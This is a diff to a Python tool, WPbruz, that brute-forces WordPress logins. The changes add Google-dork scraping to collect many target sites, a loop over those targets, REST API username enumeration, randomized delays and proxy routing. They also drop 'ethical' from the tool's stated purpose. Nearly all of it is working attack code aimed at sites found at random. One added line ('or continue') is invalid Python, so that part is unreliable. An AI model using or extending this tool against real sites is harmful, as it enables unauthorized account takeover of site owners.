@@ -15,6 +15,15 @@ import subprocess
 from pathlib import Path
 from typing import List, Optional, Tuple
 
+# ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+# OPTIONAL DEPENDENCY: googlesearch
+# pip install googlesearch-python
+# ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+try:
+    from googlesearch import search
+except ImportError:
+    search = None
+
 # ──────────────────────────────────────────────────────────────────────────────
 #  Terminal Color Codes
 # ──────────────────────────────────────────────────────────────────────────────
@@ -77,11 +86,29 @@ def setup_logging(log_file: Optional[Path] = None, debug: bool = False):
     )
 
 # ──────────────────────────────────────────────────────────────────────────────
+def find_targets_from_dork(dork: str, limit: int) -> List[str]:
+    """Scrape Google via `googlesearch` for inurl targets, default max 15."""
+    if search is None:
+        logging.error("Module googlesearch belum terinstall. pip install googlesearch-python")
+        sys.exit(1)
+
+    logging.info("Mencari target via Google dork: '%s' (max %d)", dork, limit)
+    results = []
+    for url in search(query=dork, num_results=limit, pause=2):
+        m = re.match(r"https?://[^/]+", url)
+        if m:
+            root = m.group(0)
+            if root not in results:
+                results.append(root)
+    logging.info("Ditemukan %d target", len(results))
+    return results
+
+# ──────────────────────────────────────────────────────────────────────────────
 def get_usernames(target_url: str, timeout: float) -> List[str]:
     """Try WP REST API first, fallback to author enumeration."""
     users: List[str] = []
     api_url = f"{target_url.rstrip('/')}/wp-json/wp/v2/users"
-    logging.info("Mencoba REST API: %s", api_url)
+    logging.info("[%s] Mencoba REST API: %s", target_url, api_url)
     try:
         resp = requests.get(
             api_url,
@@ -127,21 +154,22 @@ def get_usernames(target_url: str, timeout: float) -> List[str]:
 def pilih_username(usernames: List[str]) -> Optional[str]:
     """Interactive select from list."""
     if not usernames:
-        print(f"{RED}[❌] Tidak ada username ditemukan.{RESET}")
+        logging.error("Tidak ada username ditemukan.")
         return None
 
-    print(f"\n{BLUE}[🔎] Username yang ditemukan:{RESET}")
+    print()
+    logging.info("Username yang ditemukan:")
     for idx, name in enumerate(usernames, start=1):
-        print(f"   [{idx}] {GREEN}{name}{RESET}")
+        print(f"   [{idx}] {name}")
 
     while True:
         try:
-            i = int(input(f"{YELLOW}[?] Pilih nomor username: {RESET}"))
-            if 1 <= i <= len(usernames):
-                return usernames[i - 1]
+            choice = int(input(f"{YELLOW}[?] Pilih nomor username: {RESET}"))
+            if 1 <= choice <= len(usernames):
+                return usernames[choice - 1]
         except ValueError:
             pass
-        print(f"{RED}[!] Pilihan tidak valid, coba lagi.{RESET}")
+        logging.warning("Pilihan tidak valid, coba lagi.")
 
 # ──────────────────────────────────────────────────────────────────────────────
 def bruteforce_wp(
@@ -153,30 +181,28 @@ def bruteforce_wp(
     resume_file: Optional[Path],
     proxy: Optional[str]
 ) -> Optional[str]:
-    """Brute-force WordPress login sequentially, with resume checkpoint, progress & Ctrl+C handling."""
+    """Brute-force WordPress login sequentially, with resume checkpoint, progress & Ctrl+C."""
     login_url = f"{target_url.rstrip('/')}/wp-login.php"
     session = requests.Session()
     proxies = {"http": proxy, "https": proxy} if proxy else None
-
     total = len(passwords)
 
     # Resume support (reset jika out of bounds)
-    start_idx = 0
+    start = 0
     if resume_file and resume_file.exists():
         val = int(resume_file.read_text().strip() or "0")
         if val >= total:
             resume_file.unlink()
             logging.info("Resume-file melebihi wordlist, reset ke 0")
         else:
-            start_idx = val
-            logging.info("Melanjutkan dari password ke-%d", start_idx)
+            start = val
+            logging.info("Melanjutkan dari password ke-%d", start)
 
     try:
-        for idx in range(start_idx, total):
+        for idx in range(start, total):
             pwd = passwords[idx]
-            # tampilkan progress di satu baris
-            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} Mencoba password: {pwd}", end="", flush=True)
-
+            # progress
+            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} {target_url} ▶ Mencoba {username}:{pwd}", end="", flush=True)
             time.sleep(random.uniform(delay_range[0], delay_range[1]))
 
             data = {
@@ -190,42 +216,37 @@ def bruteforce_wp(
 
             try:
                 resp = session.post(
-                    login_url,
-                    data=data,
-                    timeout=timeout,
-                    allow_redirects=True,
-                    headers=headers,
-                    proxies=proxies,
+                    login_url, data=data, timeout=timeout,
+                    allow_redirects=True, headers=headers, proxies=proxies
                 )
             except requests.RequestException as e:
-                logging.warning(" Request gagal: %s", e)
+                logging.warning("Request gagal: %s", e)
                 continue
 
             cookies = session.cookies.get_dict()
             if "wordpress_logged_in" in cookies or "/wp-admin/" in resp.url:
-                print()  # newline setelah progress
+                print()  # newline
                 logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
                 if resume_file and resume_file.exists():
                     resume_file.unlink()
                 return pwd
 
-            # simpan checkpoint
+            # checkpoint
             if resume_file:
                 resume_file.write_text(str(idx + 1))
 
     except KeyboardInterrupt:
-        # Ctrl+C: cleanup resume-file dan exit
-        print()  # newline agar shell rapi
+        print()  # newline
         if resume_file and resume_file.exists():
             resume_file.unlink()
-        logging.warning("🚫 Scan dihentikan oleh user. Resume file dihapus.")
+        logging.warning("🚫 Dihentikan user, resume-file dihapus.")
         sys.exit(1)
 
-    # selesai tanpa hasil: hapus checkpoint agar run berikutnya mulai dari 0
+    # selesai tanpa hasil
     print()
     if resume_file and resume_file.exists():
         resume_file.unlink()
-    logging.error("%s Tidak ada password cocok untuk %s.%s", RED, username, RESET)
+    logging.error("Tidak ada password cocok untuk %s di %s", username, target_url)
     return None
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -233,44 +254,32 @@ def main():
     clear_screen()
     print(ASCII_ART)
 
-    parser = argparse.ArgumentParser(
-        description="WPbruz — Brute-force WordPress (ethical testing only)"
-    )
-    parser.add_argument("target", help="URL target, e.g. https://example.com")
+    parser = argparse.ArgumentParser(description="WPbruz — Brute-force WordPress (testing only)")
+    parser.add_argument("target", help="URL target (ignored if --dork dipakai)")
     parser.add_argument("wordlist", help="Path ke file password list")
     parser.add_argument("--username", help="Username WordPress (jika sudah tahu)")
-    parser.add_argument(
-        "--timeout", type=float, default=10.0, help="Timeout request (detik)"
-    )
-    parser.add_argument(
-        "--delay",
-        type=float,
-        nargs=2,
-        metavar=("MIN","MAX"),
-        default=(1.0, 3.0),
-        help="Jeda acak antar request (detik)"
-    )
-    parser.add_argument("--proxy", help="Proxy (socks5://host:port atau http://host:port)")
-    parser.add_argument(
-        "--resume-file", default=".wpbruz_resume", help="File checkpoint resume"
-    )
+    parser.add_argument("--timeout", type=float,  default=10.0, help="Timeout request (detik)")
+    parser.add_argument("--delay",   type=float, nargs=2,
+                        metavar=("MIN","MAX"), default=(1.0,3.0),
+                        help="Jeda acak antar request (detik)")
+    parser.add_argument("--proxy",   help="Proxy (socks5://host:port atau http://host:port)")
+    parser.add_argument("--resume-file", default=".wpbruz_resume",
+                        help="File checkpoint resume per run")
     parser.add_argument("--log-file", help="Simpan log ke file")
-    parser.add_argument("--debug", action="store_true", help="Tampilkan debug output")
-    args = parser.parse_args()
+    parser.add_argument("--debug",    action="store_true", help="Debug output (HTTP details)")
+    parser.add_argument("--dork",     help="Google Dork (inurl:wp-login.php site:...)")
+    parser.add_argument("--limit",    type=int, default=15, help="Maks hasil Google dork")
 
+    args = parser.parse_args()
     setup_logging(Path(args.log_file) if args.log_file else None, args.debug)
 
-    # Dapatkan username
-    if args.username:
-        user = args.username
+    # Bangun daftar target
+    if args.dork:
+        targets = find_targets_from_dork(args.dork, args.limit)
     else:
-        logging.info("Mencari username...")
-        users = get_usernames(args.target, args.timeout)
-        user = pilih_username(users)
-        if not user:
-            sys.exit(1)
+        targets = [args.target.rstrip('/')]
 
-    # Load wordlist
+    # Baca wordlist
     try:
         with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
             pwds = [line.strip() for line in f if line.strip()]
@@ -278,22 +287,35 @@ def main():
         logging.error("File wordlist tidak ditemukan: %s", args.wordlist)
         sys.exit(1)
 
-    # Mulai brute-force
-    logging.info("Mulai brute-force: %s / %d password", user, len(pwds))
-    found = bruteforce_wp(
-        target_url=args.target,
-        username=user,
-        passwords=pwds,
-        timeout=args.timeout,
-        delay_range=(args.delay[0], args.delay[1]),
-        resume_file=Path(args.resume_file),
-        proxy=args.proxy,
-    )
+    # Loop per target
+    for tgt in targets:
+        logging.info("=== Memproses target: %s ===", tgt)
 
-    if found:
-        logging.info("Sukses! %s / %s", user, found)
-    else:
-        logging.warning("Brute-force selesai tanpa hasil.")
+        # Username
+        if args.username:
+            user = args.username
+        else:
+            users = get_usernames(tgt, args.timeout)
+            user = pilih_username(users) or continue
+
+        # Brute-force
+        logging.info("Mulai brute-force %s dengan %d password", user, len(pwds))
+        found = bruteforce_wp(
+            target_url=tgt,
+            username=user,
+            passwords=pwds,
+            timeout=args.timeout,
+            delay_range=(args.delay[0], args.delay[1]),
+            resume_file=Path(args.resume_file),
+            proxy=args.proxy,
+        )
+
+        if found:
+            logging.info("=> Sukses di %s: %s / %s", tgt, user, found)
+        else:
+            logging.warning("=> Tidak ada hasil di %s", tgt)
+
+    logging.info("=== Semua target selesai ===")
 
 if __name__ == "__main__":
     main()
